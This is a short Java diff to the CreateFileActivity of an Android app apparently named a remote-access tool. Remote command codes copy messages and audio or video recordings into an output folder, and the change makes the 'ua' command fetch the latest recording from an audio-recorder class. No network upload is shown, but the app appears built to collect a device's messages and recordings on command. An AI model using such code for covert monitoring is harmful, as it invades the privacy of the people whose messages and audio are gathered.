@@ -8,6 +8,7 @@ import android.widget.Toast;
 import com.droid.remoteaccess.R;
 import com.droid.remoteaccess.feature.Constantes;
 import com.droid.remoteaccess.others.Methods;
+import com.droid.remoteaccess.recorder.DroidAudioRecorder;
 
 import java.io.File;
 import java.io.FileInputStream;
@@ -37,7 +38,11 @@ public class CreateFileActivity extends Activity {
             if ("um".equalsIgnoreCase(command)) {
                 writeMessages(outputDir);
             } else if ("ua".equalsIgnoreCase(command)) {
-                copyFile(Methods.GetPathStorage() + "/audio.mp3", new File(outputDir, "audio_" + Methods.getDateTimeFormated() + ".mp3"));
+                File audioFile = DroidAudioRecorder.getLatestAudioFile(this);
+                if (audioFile == null) {
+                    throw new IllegalStateException("Nenhum áudio gravado encontrado.");
+                }
+                copyFile(audioFile.getAbsolutePath(), new File(outputDir, "audio_" + Methods.getDateTimeFormated() + ".3gp"));
             } else if ("uv".equalsIgnoreCase(command)) {
                 copyFile(Methods.GetPathStorage() + "/video.mp4", new File(outputDir, "video_" + Methods.getDateTimeFormated() + ".mp4"));
             }
